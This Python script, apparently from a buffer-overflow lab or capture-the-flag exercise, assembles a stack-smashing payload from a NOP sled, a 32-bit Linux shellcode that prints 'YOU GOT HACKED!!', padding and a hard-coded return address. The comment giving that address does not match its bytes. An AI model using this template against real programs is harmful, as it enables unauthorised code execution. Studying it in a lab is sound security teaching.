import sys

# 100 NOPs
nop_sled = b"\x90" * 100

# custom shellcode
shellcode = (
    b"\x31\xc0\xb0\x04\x31\xdb\xb3\x01" # setup syscall
    b"\x68\x45\x44\x21\x21"  # ED!!
    b"\x68\x48\x41\x43\x4b"  # HACK
    b"\x68\x47\x4f\x54\x20"  # GOT
    b"\x68\x59\x4f\x55\x20"  # YOU
    b"\x89\xe1\xb2\x0f\xcd\x80"  # make syscall
)

# padding until return
padding = b"A" * 134

return_address = b"\x90\xcd\xff\xff" # 0xffffcea0

# combine all parts
payload = nop_sled + shellcode + padding + return_address

# print payload
sys.stdout.buffer.write(payload)

